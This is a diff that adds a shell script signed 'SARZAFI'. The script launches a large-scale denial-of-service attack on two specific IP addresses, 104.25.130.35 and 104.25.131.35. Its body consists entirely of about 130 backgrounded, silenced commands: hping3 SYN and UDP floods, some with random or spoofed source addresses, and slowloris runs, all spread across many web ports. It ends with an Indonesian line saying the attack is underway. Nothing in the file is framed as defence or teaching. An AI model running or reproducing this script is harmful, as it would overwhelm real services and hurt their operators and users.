@@ -1,0 +1,132 @@
+# CREATED BY SARZAFI #
+hping3 -c 100000000 -d 120 -S -w 64 -p 80 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 80 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 443 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 443 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2052 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2052 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2053 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2053 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2082 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2082 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2083 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2083 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2086 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2086 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2087 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2087 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2095 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2095 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2096 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 2096 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 8080 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 8080 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 8443 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 8443 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 8880 --flood --rand-source 104.25.130.35 &> /dev/null &
+hping3 -c 100000000 -d 120 -S -w 64 -p 8880 --flood --rand-source 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 80 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 80 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 443 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 443 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2052 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2052 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2053 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2053 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2082 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2082 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2083 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2083 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2086 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2086 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2087 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2087 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2095 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2095 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 2096 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 2096 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 8080 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 8080 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 8443 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 8443 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.130.35 -S -s 810000 --keep -p 8880 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 -S -s 810000 --keep -p 8880 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 80 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 80 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 443 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 443 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2052 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2052 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2053 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2053 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2082 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2082 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2083 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2083 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2086 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2086 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2087 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2087 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2095 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2095 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2096 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 2096 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 8080 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 8080 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 8443 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 8443 --flood 104.25.130.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 8880 --flood 104.25.131.35 &> /dev/null &
+hping3 -q -n -a 104.25.131.35 --udp -s 443 --keep -p 8880 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 80 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 80 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 443 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 443 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2052 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2052 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2053 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2053 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2082 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2082 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2083 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2083 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2086 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2086 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2087 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2087 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2095 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2095 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 2096 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 2096 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 8080 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 8080 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 8443 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 8443 --flood 104.25.130.35 &> /dev/null &
+hping3 -i u1 -S -p 8880 --flood 104.25.131.35 &> /dev/null &
+hping3 -i u1 -S -p 8880 --flood 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 80 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 80  104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 443 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 443 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2052 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2052 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2053 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2053 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2082 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2082 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2083 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2083 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2086 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2086 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2087 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2087 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2095 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2095 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2096 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 2096 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 8080 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 8080 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 8443 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 8443 104.25.130.35 &> /dev/null &
+slowloris -dns -num 999999 -p 8880 104.25.131.35 &> /dev/null &
+slowloris -dns -num 999999 -p 8880 104.25.130.35 &> /dev/null &
+echo "lagi nyerang ... silahkan minum kopi anda :)"
